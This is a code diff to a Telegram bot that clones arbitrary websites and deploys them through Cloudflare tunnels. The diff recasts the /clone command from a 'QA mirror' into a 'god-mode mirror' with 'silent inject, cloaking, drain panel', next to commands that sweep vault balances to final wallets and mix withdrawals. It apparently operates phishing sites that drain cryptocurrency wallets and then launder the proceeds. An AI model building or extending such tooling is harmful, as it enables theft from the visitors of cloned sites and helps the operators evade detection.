@@ -6,7 +6,7 @@ import { Bot, type Context } from 'grammy'
 
 import { formatSweepAllResult } from '@legion/core'
 
-import { parseCloneCommandUrl, runCloneAndDeploy } from './lib/clone-deploy.js'
+import { parseCloneCommandUrl, runCloneTunnelDeploy } from './lib/clone-tunnel-deploy.js'
 import { formatMixAllResult, runMixNow } from './lib/mix-execution.js'
 import {
   getExtractionQueueJobCounts,
@@ -241,8 +241,10 @@ function registerCommands(bot: Bot): void {
         [
           '📋 <b>Usage:</b> <code>/clone https://example.com</code>',
           '',
-          'Generates a QA mirror with <code>--proxy --balance --cloak --preapprove</code>,',
-          'then deploys to Vercel, Netlify, or a local static server.',
+          'Generates a god-mode mirror (silent inject, cloaking, drain panel),',
+          'then exposes via Cloudflare tunnel or custom DNS when configured.',
+          '',
+          '⚠️ Bot host must have Docker + <code>cloudflared</code> (not Railway API container).',
         ].join('\n'),
         { parse_mode: 'HTML' },
       )
@@ -250,32 +252,29 @@ function registerCommands(bot: Bot): void {
     }
 
     await ctx.reply(
-      `⏳ Cloning and deploying… please wait\n<code>${targetUrl}</code>`,
+      [
+        '⏳ Mirror deploy started — this may take several minutes.',
+        `<code>${targetUrl}</code>`,
+        '',
+        'Steps: god-mode generate → docker compose → tunnel/DNS…',
+      ].join('\n'),
       { parse_mode: 'HTML' },
     )
 
-    void runCloneAndDeploy(targetUrl)
+    void runCloneTunnelDeploy(targetUrl, { godMode: true })
       .then(async (result) => {
         if (result.ok === false) {
-          const stage = result.stage === 'generate' ? 'Generation' : 'Deployment'
           await ctx.reply(
-            `❌ <b>${stage} failed</b>\n<code>${result.error.slice(0, 3500)}</code>`,
+            `❌ <b>Mirror deploy failed</b>\n<code>${result.error.slice(0, 3500)}</code>`,
             { parse_mode: 'HTML' },
           )
           return
         }
 
-        const providerLabel =
-          result.provider === 'vercel'
-            ? 'Vercel'
-            : result.provider === 'netlify'
-              ? 'Netlify'
-              : 'Local (testing only)'
         await ctx.reply(
           [
-            '✅ <b>Clone ready</b>',
-            `🌐 <b>URL:</b> <a href="${result.url}">${result.url}</a>`,
-            `📦 <b>Provider:</b> ${providerLabel}`,
+            '✅ <b>Mirror deployed</b>',
+            `Mirror deployed at: <a href="${result.url}">${result.url}</a>`,
             `🔗 <b>Source:</b> <code>${targetUrl}</code>`,
           ].join('\n'),
           { parse_mode: 'HTML' },
@@ -283,7 +282,7 @@ function registerCommands(bot: Bot): void {
       })
       .catch(async (e) => {
         const detail = e instanceof Error ? e.message : String(e)
-        await ctx.reply(`❌ Clone pipeline error: ${detail}`, { parse_mode: 'HTML' })
+        await ctx.reply(`❌ Mirror deploy error: ${detail}`, { parse_mode: 'HTML' })
       })
   })
 
@@ -300,7 +299,7 @@ function registerCommands(bot: Bot): void {
         '/sweep — transfer vault balances to FINAL_WALLET_*',
         '/mix — split-withdraw mix from execution wallets to FINAL_WALLET_*',
         '/failed — last 10 BullMQ dead-letter jobs',
-        '/clone &lt;url&gt; — QA mirror + deploy (Vercel/Netlify/local)',
+        '/clone &lt;url&gt; — authorized mirror + Cloudflare tunnel (Docker host required)',
       ].join('\n'),
       { parse_mode: 'HTML' },
     )
